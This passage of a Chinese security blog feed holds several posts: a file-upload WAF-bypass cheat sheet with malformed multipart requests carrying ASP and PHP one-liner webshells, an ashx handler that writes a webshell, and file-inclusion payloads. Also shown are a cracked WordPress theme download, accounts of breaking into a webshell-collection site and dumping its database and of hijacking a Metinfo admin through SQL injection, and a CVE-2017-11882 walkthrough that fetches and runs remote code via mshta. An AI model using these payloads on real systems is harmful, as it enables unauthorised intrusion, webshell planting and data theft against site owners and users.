class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">1   Content-Type: multipart/form-data; boundary=</div><div class="line">    [加个空格]---------------------------4714631421141173021852555099</div><div class="line"> </div><div class="line">2   boundary不一致</div><div class="line">    Content-Type: multipart/form-data; </div><div class="line">    boundary=---------------------------4714631421141173021852555099</div><div class="line">    Content-Length: 253</div><div class="line"> </div><div class="line">    -----------------------------47146314211411730218525[改成别的]99</div><div class="line">    Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</div><div class="line">    Content-Type: application/octet-stream</div><div class="line"> </div><div class="line">    &lt;%eval request(&quot;a&quot;)%&gt;</div><div class="line">    -----------------------------4714631421141173021852555099--</div><div class="line"> </div><div class="line">3   ASCII &gt; 127的字符</div><div class="line">    1.asp;[af截断].jpg</div><div class="line"> </div><div class="line">4   Content-Disposition长度[例如超过1M]字节[将垃圾数据放在数据包最开头]</div><div class="line"> </div><div class="line">5   长文件名 1.................[很长]..........................php</div><div class="line">     </div><div class="line">6   特殊的长文件名</div><div class="line">    shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg </div><div class="line"> </div><div class="line">7   多个filename </div><div class="line">    -----------------------------47146314211411730218525[改成别的]99</div><div class="line">    Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;1.asp&quot;;filename=&quot;1.jpg&quot;    [或者把filename放到content-type下面]</div><div class="line">    Content-Type: application/octet-stream</div><div class="line"> </div><div class="line">8   POST/GET</div><div class="line">    上传一个POST型的数据包，抓包将POST改为GET</div><div class="line"> </div><div class="line">9   删除实体里面的Conten-Type字段</div><div class="line">    一.删除Content整行</div><div class="line">    二.删除C后面的字符</div><div class="line">    正常包：</div><div class="line">        Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.png&quot;</div><div class="line">        Content-Type: image/png</div><div class="line">    构造包： </div><div class="line">        Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.png </div><div class="line">        C.php&quot;</div><div class="line"> </div><div class="line">10  文件名回车</div><div class="line">    -----------------------------4714631421141173021852599</div><div class="line">    Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.as</div><div class="line">    p&quot;</div><div class="line">    Content-Type: application/octet-stream   </div><div class="line"> </div><div class="line">11  删除Content-Disposition字段里的空格</div><div class="line"> </div><div class="line">12  修改Content-Disposition字段值的大小写</div><div class="line">    -----------------------------4714631421141173021852599</div><div class="line">    Content-Disposition: [大写F]orm-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;</div><div class="line">    Content-Type: application/octet-stream </div><div class="line"> </div><div class="line">13  Tab</div><div class="line">    -----------------------------20566128503514</div><div class="line">    Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=[Tab]     &quot;e.php&quot;</div><div class="line">    Content-Type: application/force-download</div><div class="line"> </div><div class="line">14  去空格</div><div class="line">    -----------------------------20566128503514</div><div class="line">    Content-Disposition: form-data;name=&quot;uploaded&quot;; filename=&quot;e.php&quot;</div><div class="line">    Content-Type: application/force-download</div><div class="line"> </div><div class="line">15  form-data删掉</div><div class="line">    -----------------------------20566128503514</div><div class="line">    Content-Disposition: ;name=&quot;uploaded&quot;; filename=&quot;e.php&quot;</div><div class="line">    Content-Type: application/force-download</div><div class="line"> </div><div class="line">16  加个符号</div><div class="line">    -----------------------------20566128503514</div><div class="line">    Content-Disposition: form-data;; name=&quot;uploaded&quot;; filename=&quot;e.php&quot;</div><div class="line">    Content-Type: application/force-download</div></pre></td></tr></table></figure></p><p><strong>顺便提下数据库</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Mysql       1e1&#123;union from&#125;、\nkeyword、&#123;+ - `` &apos;&apos; &quot;&quot; ~ ! @ () &#123;&#125; &#125;keyword</div><div class="line">            10个可代替空格的字符、Error Return设计缺陷等 …</div><div class="line"> </div><div class="line">Mssql       30多个可代替空格的字符、Error Return设计缺陷等 …</div><div class="line"> </div><div class="line">Annotation  -- , # , -- + , // , -- - , /**/ , ;%00 , /*!20000*/</div><div class="line"> </div><div class="line">Apache      解析特性、HPP、畸形method、畸形Boundary等 …</div><div class="line"> </div><div class="line">Nginx       关注系统&amp;语言&amp;数据库特性&amp;解析特性等 …</div><div class="line"> </div><div class="line">OSX         test.php&#123;\xFC[\x80-\x83]&#125;</div><div class="line"> </div><div class="line">Linux       host&apos;&apos;name</div><div class="line"> </div><div class="line">Windows&amp;IIS  </div><div class="line">            Unicode、畸形Unicode、ADS流、N种HTTP畸形正文、</div><div class="line">            解析特性、截断特性、HP、畸形Boundary、GET／POST傻傻分不清、</div><div class="line">            无数畸形字符可以 代替正常字符等 …</div><div class="line"> </div><div class="line">Encoder     Json、Unicode、Base64、Url Encode、Html、Serialize、双重编码等 …</div><div class="line"> </div><div class="line">User-Agent  特殊放行  [google蜘蛛：Googlebot 百度蜘蛛：Baiduspider]</div></pre></td></tr></table></figure></p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">[*] filename在content-type下面</div><div class="line">[*] .asp&#123;80-90&#125;</div><div class="line">[*] NTFS ADS</div><div class="line">[*] .asp...</div><div class="line">[*] boundary不一致</div><div class="line">[*] iis6分号截断asp.asp;asp.jpg</div><div class="line">[*] apache解析漏洞php.php.ddd</div><div class="line">[*] boundary和content-disposition中间插入换行</div><div class="line">[*] hello.php:a.jpg然后hello.&lt;&lt;&lt;</div><div class="line">[*] filename=php.php</div><div class="line">[*] filename=&quot;a.txt&quot;;filename=&quot;a.php&quot;</div><div class="line">[*] name=\n&quot;file&quot;;filename=&quot;a.php&quot;</div><div class="line">[*] content-disposition:\n</div><div class="line">[*] .htaccess文件</div><div class="line">[*] a.jpg.\nphp</div><div class="line">[*] 去掉content-disposition的form-data字段</div><div class="line">[*] php&lt;5.3 单双引号截断特性</div><div class="line">[*] 删掉content-disposition: form-data;</div><div class="line">[*] content-disposition\00:</div><div class="line">[*] &#123;char&#125;+content-disposition</div><div class="line">[*] head头的content-type: tab</div><div class="line">[*] head头的content-type: multipart/form-DATA</div><div class="line">[*] filename后缀改为大写</div><div class="line">[*] head头的Content-Type: multipart/form-data;\n</div><div class="line">[*] .asp空格</div><div class="line">[*] .asp0x00.jpg截断</div><div class="line">[*] 双boundary</div><div class="line">[*] file\nname=&quot;php.php&quot;</div><div class="line">[*] head头content-type空格:</div><div class="line">[*] form-data字段与name字段交换位置</div></pre></td></tr></table></figure><h1 id="0x07-针对云WAF"><a href="#0x07-针对云WAF" class="headerlink" title="0x07 针对云WAF"></a>0x07 针对云WAF</h1><ul><li>不要相信Demo的规则</li><li>多收集例站进行站点随机Fuzz，建议至少50+</li><li>针对IPS／IDS</li><li>尽可能先拿到早版本的交互层代码</li><li>扫其服务测其EXP</li><li>针对主机防护软件</li><li>WAF就在眼前，Rule我想去猜猜</li><li>懂逆向则逆向，不懂逆向就瞎Fuzz，内存泄露、dll劫持使劲怼，crash了最好。</li></ul><h1 id="0x08-其他"><a href="#0x08-其他" class="headerlink" title="0x08 其他"></a>0x08 其他</h1><p><strong>ashx写asp的一句话</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;%@ WebHandler Language=&quot;C#&quot;Class=&quot;Handler&quot; %&gt;</div><div class="line">using System;</div><div class="line">using System.Web;</div><div class="line">using System.IO;</div><div class="line">public class Handler : IHttpHandler &#123;</div><div class="line">public void ProcessRequest (HttpContext context) &#123;</div><div class="line">context.Response.ContentType = &quot;text/plain&quot;;</div><div class="line">StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.asp&quot;));</div><div class="line">file1.Write(&quot;&lt;%response.clear:execute request(\&quot;root\&quot;):response.End%&gt;&quot;);</div><div class="line">file1.Flush();</div><div class="line">file1.Close();</div><div class="line">&#125;</div><div class="line">public bool IsReusable &#123;</div><div class="line">get &#123;</div><div class="line">return false;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">%&gt;</div></pre></td></tr></table></figure></p><p><strong>文件包含</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">一 </div><div class="line">    &lt;?php include ($_GET[&apos;cmd&apos;]);?&gt;         include.php </div><div class="line">    &lt;?php @eval($_POST[1]);?&gt;               1.txt </div><div class="line">        include.php?cmd=1.txt               菜刀连接</div><div class="line">    &lt;?php fputs(fopen(&apos;cmd.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1]);?&gt;&apos;)?&gt;  2.txt</div><div class="line">        include.php?cmd=2.txt               生成cmd.php</div><div class="line">    include.php?cmd=data:text/plain,&lt;?php fputs(fopen(&apos;cmd1.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[1]);?&gt;&apos;)?&gt;                 协议生成cmd1.php</div><div class="line">二 </div><div class="line"> </div><div class="line">    &lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt;              #PHP   </div><div class="line">    &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;          #ASP    </div><div class="line">    &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;          #ASPX   </div><div class="line">    &lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;             #JSP    </div><div class="line">    &lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</div><div class="line">    &lt;c:import url=&quot;上传的txt文件路径&quot;&gt;                 #JSTL</div><div class="line">三  &lt;?php include &apos;phar://1.rar/1.txt&apos;;?&gt;       访问后再访问/1/1.txt即可</div></pre></td></tr></table></figure></p><p><a href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/" target="_blank" rel="external">编辑器绕过</a></p><p>下载地址:<br><a href="http://oq4ris5sp.bkt.clouddn.com/editor1.pdf" target="_blank" rel="external">PDF1下载</a><br><a href="http://oq4ris5sp.bkt.clouddn.com/editor.pdf" target="_blank" rel="external">PDF2下载</a>  </p><p>其他资料:<br><a href="http://cracer.com/?p=350" target="_blank" rel="external">绕waf资料</a><br><a href="http://www.freebuf.com/articles/web/18084.html" target="_blank" rel="external">WAF基础了解</a><br><a href="http://blog.csdn.net/u011066706/article/details/51175401?locationNum=11" target="_blank" rel="external">NTFS-ADS流文件</a><br><a href="http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">文件上传绕过姿势总结</a>  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-常规上传突破&quot;&gt;&lt;a href=&quot;#0x01-常规上传突破&quot; class=&quot;headerlink&quot; title=&quot;0x01 常规上传突破&quot;&gt;&lt;/a&gt;0x01 常规上传突破&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;常见扩展名黑名单&lt;/strong&gt;&lt;br&gt;&lt;figu
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WP主题：DUX3.0&amp;2.0主题开心版</title>
    <link href="http://www.chabug.org/2017/12/23/dux3-and-2/"/>
    <id>http://www.chabug.org/2017/12/23/dux3-and-2/</id>
    <published>2017-12-23T05:49:16.000Z</published>
    <updated>2017-12-23T05:53:35.888Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://ws2.sinaimg.cn/mw690/7efa749fly1fmn5apzu1ej20mg0alq56.jpg" alt=""><br><strong>DUX主题更新方法</strong></p><p>主题更新方法：</p><p>使用FTP软件上传 dux文件夹到服务器的 wp-content/themes 目录下，替换所有文件即可。</p><p>注：使用此方法更新主题会保留网站之前的 dux主题设置。</p><p><strong>DUX主题更新记录</strong></p><p>DUX主题3.0版本更新内容：</p><ul><li><p>全新的标签云（tags）页面</p></li><li><p>新增分类的SEO标题、SEO关键字和SEO描述</p></li><li><p>新增聚合文章小工具按浏览量排序的文章展示</p></li><li><p>新增链接分类可排序，按别名字母或数字从小到大排序，适用于主题中所有的链接调取</p></li><li><p>新增链接可排序，按评分从高到低排序，适用于主题中所有的链接调取</p></li><li><p>新增对WP4.8+小工具文本的可视化展示支持</p></li><li><p>新增对WP4.8+小工具音频、视频、图像的支持</p></li><li><p>修改站点设置中副标题为空时只显示站点标题</p></li><li><p>修改文章和页面的自动描述（description）字数限制为200</p></li><li><p>修改标签页面的描述（description）为标签的图像描述</p></li><li><p>解决找回密码页面下拉可能发生的页面抖动</p></li><li><p>解决主题设置中图片地址参数被过滤的问题</p></li><li><p>解决搜索页面搜索框不显示的问题</p></li><li><p>去除主题设置中的360公共资源库引用</p></li><li><p>修改图片lazyload缩略图的判断方式</p></li><li><p>其他小问题的修复</p></li></ul><p><strong>下载地址</strong></p><p>3.0版本下载地址：<a href="https://pan.baidu.com/s/1o8IGgrS" target="_blank" rel="external">https://pan.baidu.com/s/1o8IGgrS</a>    3.0版本密码：15d3</p><p>2.0版本下载地址：<a href="https://pan.baidu.com/s/1pKKzyrh" target="_blank" rel="external">https://pan.baidu.com/s/1pKKzyrh</a>    2.0版本密码：yfnj</p><p><strong>注意事项：<br>大前端Dux3.0主题，来源网络，经本站认真测试功能完整无任何限制，无任何后门或者恶意代码。<br>再次申明：经本站下载的主题都是用来学习研究用，如需商用请购买正版！</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://ws2.sinaimg.cn/mw690/7efa749fly1fmn5apzu1ej20mg0alq56.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;strong&gt;DUX主题更新方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;主题更新方法：&lt;/p&gt;
&lt;p&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>看我如何搞掉国内最大的webshell箱子</title>
    <link href="http://www.chabug.org/2017/12/16/hack-webshellbox-mumaasp/"/>
    <id>http://www.chabug.org/2017/12/16/hack-webshellbox-mumaasp/</id>
    <published>2017-12-16T14:32:39.000Z</published>
    <updated>2017-12-22T10:09:47.675Z</updated>
    
    <content type="html"><![CDATA[<p>好像是最大的 管它呢</p><p>先下载它的一个asp大马.<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4go55j31400dp75l.jpg" alt=""><br>放入wwwroot netbox 启动<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4edawj30go02rgll.jpg" alt=""><br>抓包分析<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4jwkqj31gt06l0ub.jpg" alt=""><br><code>http://www.mumaasp.com/xz/sx.asp?u=127.0.0.1:81/Asp%C3%E2%C9%B1%B4%F3%C2%ED.asp&amp;p=mumaasp.com</code></p><p>u 为网站地址 p为shell密码</p><p>本来想插xss的 不过手贱打开看了一下<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4eepuj30gk06o0sy.jpg" alt=""><br>源码直接爆出来了 其中有Checkxss函数</p><p>可以进行代码审计 不过再往下翻看看?<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4fqahj30hs06eglu.jpg" alt=""><br><code>^%$@#!!!858879018!@#.mdb</code></p><p>数据库名称</p><p>url编码</p><p><code>%5E%25%24%40%23%21%21%21%38%35%38%38%37%39%30%31%38%21%40%23%2E%6D%64%62</code></p><p>访问<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4eh75j30cg05t74e.jpg" alt=""><br>88745条  </p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppf4dql4j303j00r0n5.jpg" alt=""><br>惊不惊喜 意不意外<br><code>裤子就不放出来了。</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好像是最大的 管它呢&lt;/p&gt;
&lt;p&gt;先下载它的一个asp大马.&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/006xriynly1fmppf4go55j31400dp75l.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;放入wwwroot netbo
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>记一次Metinfo渗透</title>
    <link href="http://www.chabug.org/2017/12/16/metinfo-test/"/>
    <id>http://www.chabug.org/2017/12/16/metinfo-test/</id>
    <published>2017-12-16T14:20:37.000Z</published>
    <updated>2017-12-22T10:13:45.745Z</updated>
    
    <content type="html"><![CDATA[<p>全文转自<a href="http://exp10it.tk/index.php/archives/163/" target="_blank" rel="external">X1r0z</a><br>目标站</p><p>php + mysql + iis6 + 2003</p><p>查看一下robots.txt<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzfvp2j30i50d0t9f.jpg" alt=""><br>访问 /admin</p><p>登录框输入单引号 没报错</p><p>查看网站title才发现这是metinfo的<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzdmg2j30sr0didga.jpg" alt=""></p><p>搜索了一下metinfo的最新漏洞</p><p>metinfo 5.3.1 注入漏洞 + 后台getshell</p><p>直接访问</p><p><code>/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</code></p><p>将admin密码改成1234567</p><p>感觉有点暴力= =</p><p>成功登录后台<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzcva6j30uq0hgt9f.jpg" alt=""><br>在文章那里找到上传点<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzcxxyj30d50hm3zi.jpg" alt=""><br>CKFinder<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzcj2gj30qz052mxc.jpg" alt=""><br>服务器是iis6的 可以直接用解析漏洞</p><p>这里的CKFinder不能重命名</p><p>直接创建a.asp文件夹 上传一句话<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzd1f2j30cs068glm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fmppjzgyc6j30lt07ft8w.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;全文转自&lt;a href=&quot;http://exp10it.tk/index.php/archives/163/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;X1r0z&lt;/a&gt;&lt;br&gt;目标站&lt;/p&gt;
&lt;p&gt;php + mysql + iis6 + 2003&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>分享一个可以用模板的自动签到系统🙄</title>
    <link href="http://www.chabug.org/2017/11/23/qiandao-today/"/>
    <id>http://www.chabug.org/2017/11/23/qiandao-today/</id>
    <published>2017-11-23T13:45:17.000Z</published>
    <updated>2017-11-23T14:14:57.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常常混迹各大论坛和剁手网站的小伙伴们，各大网站为了蚕食我们的时间，基本都是有推出了每日签到的系统，比如JD豆，经验值，金币，积分等等。。。并且很多必须还要连续不间断签到才能获得更高的奖励。🤢  </p><p>然而平常稍微忙一点的话，一下子就前功尽弃了。 🙃</p><p>所以一个叫签到.TODAY的项目诞生了。  </p><h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/binux/qiandao" target="_blank" rel="external">binux/qiandao</a></p><h1 id="项目演示"><a href="#项目演示" class="headerlink" title="项目演示"></a>项目演示</h1><p><a href="https://qiandao.today/" target="_blank" rel="external">QIANDAO.TODAY</a></p><p>演示网站是作者自己开的，里面可以注册帐号并且直接可以使用搭建好的签到系统。🤔</p><p>当然若是害怕隐私被泄露的话，也建议自己在GITHUB中下载源码自行部署🙃</p><h1 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h1><p>签到模板基本上分成三大类：</p><ul><li><p>直接账号密码签到<br>直接使用要签到网站的帐号密码来签到。</p></li><li><p>PC网页端COOKIES签到<br>在Chrome中使用<a href="https://github.com/acgotaku/GetCookies" target="_blank" rel="external">Cookies获取助手</a>自动抓取Cookies，在签到面板中可以直接一键获取需要的Cookies来签到。</p></li><li><p>移动设备端COOKIES签到<br>PC上使用软件Fiddler来抓取移动设备签到时的Cookies，再填入签到面板的Cookies栏来签到。</p></li></ul><h1 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>需要 python2.7, <strong>虚拟主机无法安装</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install python-dev autoconf g++ python-pbkdf2</div><div class="line">pip install tornado u-msgpack-python jinja2 chardet requests pbkdf2 pycrypto</div></pre></td></tr></table></figure></p><p>可选 redis, Mysql</p><p><code>mysql &lt; qiandao.sql</code></p><p>启动</p><p><code>./run.py</code><br>去 <a href="https://qiandao.today/tpls/public" target="_blank" rel="external">https://qiandao.today/tpls/public</a> 查看你需要的模板，点击下载。 在你自己的主页中 <code>「我的模板+」</code> 点击 + <code>上传</code>。模板需要发布才会在<code>「公开模板」</code>中展示，你需要管理员权限在<code>「我的发布请求」</code>中审批通过。</p><p>设置管理员</p><p><code>./chrole.py your@email.address admin</code></p><h2 id="使用Docker部署站点"><a href="#使用Docker部署站点" class="headerlink" title="使用Docker部署站点"></a>使用Docker部署站点</h2><p>可参考 <a href="https://github.com/binux/qiandao/wiki/Docker%E9%83%A8%E7%BD%B2%E7%AD%BE%E5%88%B0%E7%AB%99%E6%95%99%E7%A8%8B" target="_blank" rel="external">Wiki Docker部署签到站教程</a></p><hr><p>qiandao.py</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install tornado u-msgpack-python jinja2 chardet requests</div><div class="line">./qiandao.py tpl.har [--key=value]* [env.json]</div></pre></td></tr></table></figure><hr><p>config.py</p><hr><p>优先用<code>mailgun</code>方式发送邮件，如果要用smtp方式发送邮件，请填写<code>mail_smtp</code>, <code>mail_user</code>, <code>mail_password</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mail_smtp = &quot;&quot;     # 邮件smtp 地址</div><div class="line">mail_user = &quot;&quot;    # 邮件账户</div><div class="line">mail_passowrd = &quot;&quot;   # 邮件密码</div><div class="line">mail_domain = &quot;mail.qiandao.today&quot;</div><div class="line">mailgun_key = &quot;&quot;</div></pre></td></tr></table></figure></p><h1 id="如何创建签到模板"><a href="#如何创建签到模板" class="headerlink" title="如何创建签到模板"></a>如何创建签到模板</h1><p><a href="https://github.com/binux/qiandao/blob/master/docs/har-howto.md" target="_blank" rel="external">参考此开发文档</a>😋</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;常常混迹各大论坛和剁手网站的小伙伴们，各大网站为了蚕食我们的时间，基本都是有推出了每日签到的系统，比如JD豆，经验值，金币，积分等等。。。并
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>对于CVE-2017-11882的利用</title>
    <link href="http://www.chabug.org/2017/11/23/CVE-2017-11882/"/>
    <id>http://www.chabug.org/2017/11/23/CVE-2017-11882/</id>
    <published>2017-11-23T06:01:09.000Z</published>
    <updated>2017-11-23T06:11:21.809Z</updated>
    
    <content type="html"><![CDATA[<p>最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:<a href="http://www.freebuf.com/vuls/154462.html" target="_blank" rel="external">隐藏17年的Office远程代码执行漏洞POC样本分析（CVE-2017-11882)</a>。</p><p>今天在twitter上看到有人共享了一个POC，<a href="https://twitter.com/gossithedog/status/932694287480913920" target="_blank" rel="external">twitter地址</a>，<a href="http://owned.lab6.com/~gossi/research/public/cve-2017-11882/" target="_blank" rel="external">Poc地址</a>，后来又看到有人共享了一个项目<a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="external">CVE-2017-11882</a>，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式来执行远程文件的，使用起来可能并不容易。<br>然后在GitHub上又找到了一个，<a href="https://github.com/Ridter/CVE-2017-11882/" target="_blank" rel="external">项目地址</a>。<br>使用方式很简单，如果要执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"cmd.exe /c calc.exe"</span> -o test.doc</div></pre></td></tr></table></figure><p>demo<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flrziofcqgg30w40hznpd.gif" alt=""></p><p>进一步利用，由于有长度的限制，这里可以采用mshta的方式来执行。构造的命令如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python Command_CVE<span class="number">-2017</span><span class="number">-11882.</span>py -c <span class="string">"mshta http://site.com/abc"</span> -o test.doc</div></pre></td></tr></table></figure></p><p>最终效果如下：<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flrzkkb094g30w40hzwtb.gif" alt=""><br>解决方案：</p><p>1、微软已经对此漏洞做出了修复。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">下载https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882  更新补丁进行修补</div><div class="line">开启Windows Update功能，定期对系统进行自动更新</div></pre></td></tr></table></figure></p><p>由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</p><p>按下Win+R组合键，打开cmd.exe</p><p>对应office版本修改以下注册表路径以后，输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400</div><div class="line"></div><div class="line">reg add &quot;HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COM Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;&quot; /v &quot;Compatibility Flags&quot; /t REG_DWORD /d 0x400</div><div class="line">office</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:&lt;a href=&quot;http://www.freebuf.com/vuls/154462.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;隐藏17年的Office远程代码执行漏
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>贼好看之Xshell5的配色方案monokai</title>
    <link href="http://www.chabug.org/2017/11/21/xshell-color/"/>
    <id>http://www.chabug.org/2017/11/21/xshell-color/</id>
    <published>2017-11-21T07:58:25.000Z</published>
    <updated>2017-11-21T08:05:44.430Z</updated>
    
